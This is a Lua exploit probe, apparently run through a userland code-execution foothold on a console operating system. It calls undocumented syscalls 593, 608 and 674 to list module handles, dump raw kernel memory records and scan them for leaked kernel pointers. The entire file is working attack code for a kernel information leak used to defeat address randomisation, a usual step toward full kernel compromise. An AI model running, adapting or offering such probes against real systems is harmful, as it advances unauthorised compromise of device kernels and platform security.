-- CRASH_CLASS: LOW
-- PROBE 1198a: sys 608 dynlib_get_info_ex — kernel qword dump
--
-- Context: upstream branch analysis shows 608 copies RAW kernel qwords to userland.
-- ABI: arg0 = module id, arg1 = flags, arg2 = pointer to buffer (first qword = 0x1a8).
-- Fields at +0x110, +0x128, +0x130, +0x148, +0x150 come from unmodified kernel entry.
-- Phase A: discover live module handles via 593
-- Phase B: call 608 on each live handle with flags 0-3, scan for kernel pointers
-- Phase C: test sys 674 with magic word 0x40000000

print("=== PROBE 1198a: sys 608 dynlib_get_info_ex RECORDS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function()
        memory.write_qword(addr, uint64(string.format("0x%08X%08X",
            math.floor(to_num(val)/4294967296), to_num(val) % 4294967296)))
    end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function hex64(lo, hi)
    return string.format("%08X_%08X", (hi or 0) % 4294967296, (lo or 0) % 4294967296)
end

local function sentinel(buf, n)
    for o = 0, (n or 0x3FC) - 1, 4 do safe_wd(buf + o, 0xA5A5A5A5) end
end

local function scan_kptrs(buf, n, label)
    local found = 0
    for o = 0, n - 8, 8 do
        local lo = safe_rd(buf + o)
        local hi = safe_rd(buf + o + 4)
        if lo and hi and hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
            print(string.format("  *** KPTR %s +0x%03X = %s ***", label, o, hex64(lo, hi)))
            found = found + 1
        end
    end
    return found
end

local function hex_dump(buf, n, label)
    for o = 0, n - 1, 16 do
        local vals = {}
        for k = 0, 12, 4 do
            if o + k < n then
                vals[#vals + 1] = string.format("%08X", safe_rd(buf + o + k) or 0)
            end
        end
        print(string.format("  %s +%03X  %s", label, o, table.concat(vals, " ")))
    end
end

local buf = to_num(memory.alloc(0x400))
local buf2 = to_num(memory.alloc(0x400))

-- ========== Phase A: discover live module handles via 593 ==========
print("--- PHASE A: discover live module handles (sys 593) ---")

local sc593 = make_syscall(593)
local live_handles = {}

for h = 0, 50 do
    sentinel(buf, 0x200)
    safe_wd(buf, 0x160)
    local ok, rv = pcall(function()
        return sc593(uint64(h), uint64(buf))
    end)
    local r = ok and to_num(rv) or -999
    if r == 0 then
        local name_bytes = {}
        for i = 0, 31 do
            local b = safe_rd(buf + 0x08 + i)
            if b and b > 0 and b < 128 then
                name_bytes[#name_bytes + 1] = string.char(b)
            end
        end
        local name = table.concat(name_bytes)
        if #name == 0 then name = "(unnamed)" end
        print(string.format("  [A] handle=%d name=%s", h, name))
        live_handles[#live_handles + 1] = h
    end
end

print(string.format("  [A] total live handles: %d", #live_handles))

-- ========== Phase B: sys 608 on each live handle ==========
print("")
print("--- PHASE B: sys 608 dynlib_get_info_ex records ---")

local sc608 = make_syscall(608)
local total_kptrs = 0

for _, h in ipairs(live_handles) do
    for fl = 0, 3 do
        sentinel(buf, 0x1B0)

        -- first qword = 0x1a8 (required size marker)
        safe_wd(buf, 0xA8)
        safe_wd(buf + 4, 0x01)

        local ok, rv = pcall(function()
            return sc608(uint64(h), uint64(fl), uint64(buf), uint64(0), uint64(0))
        end)
        local r = ok and to_num(rv) or -999

        if r == 0 then
            local kn = scan_kptrs(buf, 0x1A8, string.format("h%d.f%d", h, fl))
            total_kptrs = total_kptrs + kn

            -- dump the critical offsets where upstream says raw kernel qwords live
            local critical = {0x110, 0x128, 0x130, 0x148, 0x150}
            local parts = {}
            for _, off in ipairs(critical) do
                local lo = safe_rd(buf + off)
                local hi = safe_rd(buf + off + 4)
                parts[#parts + 1] = string.format("+%03X=%s", off, hex64(lo, hi))
            end
            print(string.format("  [B] 608(h=%d f=%d) rv=0 CRITICAL: %s", h, fl, table.concat(parts, " ")))

            -- full dump only for handle 0 flags 0 (eboot) to keep output manageable
            if h == 0 and fl == 0 then
                print("  [B] Full 0x1a8 dump for eboot (h=0 f=0):")
                hex_dump(buf, 0x1A8, "eboot")
            end
        else
            -- only print first failure per handle (avoid noise)
            if fl == 0 then
                print(string.format("  [B] 608(h=%d f=0) rv=%d", h, r))
            end
        end
    end
end

print(string.format("  [B] TOTAL KERNEL POINTERS FOUND: %d", total_kptrs))

-- ========== Phase C: sys 674 with magic word 0x40000000 ==========
print("")
print("--- PHASE C: sys 674 virtual_query_all with magic word ---")

local sc674 = make_syscall(674)
local out_count_buf = to_num(memory.alloc(16))
local record_buf = to_num(memory.alloc(0x4000))

-- shape: 674(buf, max_records, out_count, flags_with_magic, magic_word)
-- upstream ABI: uap+0x20 must be 0x40000000
for _, shape in ipairs({
    {record_buf, 128, out_count_buf, 0, 0x40000000},
    {record_buf, 128, out_count_buf, 0x40000000, 0},
    {record_buf, 0x40000000, out_count_buf, 128, 0},
}) do
    sentinel(record_buf, 0x4000)
    safe_wd(out_count_buf, 0)
    safe_wd(out_count_buf + 4, 0)

    local ok, rv = pcall(function()
        return sc674(uint64(shape[1]), uint64(shape[2]), uint64(shape[3]),
                      uint64(shape[4]), uint64(shape[5]))
    end)
    local r = ok and to_num(rv) or -999
    local cnt_lo = safe_rd(out_count_buf)
    local cnt_hi = safe_rd(out_count_buf + 4)

    print(string.format("  [C] 674(%X, %X, out, %X, %X) rv=%d out_count=%s",
        shape[1], shape[2], shape[4], shape[5], r, hex64(cnt_lo, cnt_hi)))

    if r == 0 and (cnt_lo or 0) > 0 then
        local count = cnt_lo
        if count > 10 then count = 10 end
        print(string.format("  [C] first %d of %d records:", count, cnt_lo))
        for i = 0, count - 1 do
            local base = record_buf + i * 0x48
            local start_lo = safe_rd(base)
            local start_hi = safe_rd(base + 4)
            local end_lo = safe_rd(base + 8)
            local end_hi = safe_rd(base + 12)
            local prot = safe_rd(base + 0x18)
            print(string.format("    rec[%d] start=%s end=%s prot=0x%X",
                i, hex64(start_lo, start_hi), hex64(end_lo, end_hi), prot or 0))
            local kn = scan_kptrs(base, 0x48, string.format("rec%d", i))
            total_kptrs = total_kptrs + kn
        end
    end
end

print("")
print(string.format("=== GRAND TOTAL KERNEL POINTERS: %d ===", total_kptrs))
print("[Z] alive")
print("=== DONE ===")
